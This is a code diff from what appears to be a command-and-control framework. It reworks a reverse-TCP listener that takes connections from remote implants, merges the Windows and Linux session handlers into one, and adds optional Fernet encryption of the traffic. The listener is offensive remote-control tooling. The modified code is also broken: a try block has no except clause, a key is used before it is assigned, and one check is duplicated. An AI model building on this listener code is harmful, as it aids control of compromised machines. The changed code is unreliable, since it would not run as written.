@@ -9,8 +9,7 @@ from Creator.available import (AVAILABLE_ENCODINGS, AVAILABLE_FORMATS,
                                AVAILABLE_LISTENERS)
 from cryptography.fernet import Fernet
 from Database import ListenerModel, db_session
-from Handlers.socket.reverse.tcp.linux import Linux
-from Handlers.socket.reverse.tcp.windows import Windows
+from Handlers.socket.reverse.tcp import Handler
 from Listeners.base import BaseListener
 from Utils.options import (AddressType, BooleanType, ChoiceType, IntegerType,
                            Option, OptionPool, StringType, TableType)
@@ -61,6 +60,13 @@ class Listener(BaseListener):
             description="How many devices can be connected to one listener at once.",
             type=IntegerType,
             default=5
+        ),
+        Option(
+            name="Fernet-Key Encryption",
+            _real_name="fernet",
+            description="Use fernet for encrypting the messages, when they are transported.",
+            type=BooleanType,
+            default=True
         )
     ])
     stager_pool = OptionPool([
@@ -179,39 +185,24 @@ class Listener(BaseListener):
             except Exception:
                 pass
             else:
-                key = Fernet.generate_key()
                 try:
-                    connection.send(key)
-                except socket.error:
-                    continue
-                try:
-                    operating_system = self.decrypt(
-                        connection.recv(1024), key).lower()
-                except:
-                    connection.close()
-                    continue
-                log(
-                    f"New Connection established from {addr[0]}", alert="success")
-                if operating_system == "windows":
-                    # Create a Windows Object to store the connection
-                    self.add_handler(
-                        Windows(
-                            connection,
-                            addr[0],
-                            key,
-                            self.commander.active_handlers_count + 1))
-                elif operating_system == "linux":
-                    # Create a Linux Object to store the connection
-                    self.add_handler(
-                        Linux(
-                            connection, addr[0],
-                            key,
-                            self.commander.active_handlers_count + 1))
-                else:
-                    log(f"Unknown Operating System: {operating_system}",
-                        alert="error")
-                    connection.close()
-                    continue
+                    connection.send(b"")
+                log(f"New Connection established from {addr[0]}", alert="success")
+                handler = Handler(
+                                connection,
+                                addr[0],
+                                key,
+                                self.commander.active_handlers_count + 1)
+                if self.db_entry.options["fernet"]:
+                    key = Fernet.generate_key()
+                    try:
+                        connection.send(key)
+                    except socket.error:
+                        continue
+
+                    if self.db_entry.options["fernet"]:
+                        handler.key = key
+                db_session.commit()
 
     def start(self):
         try:
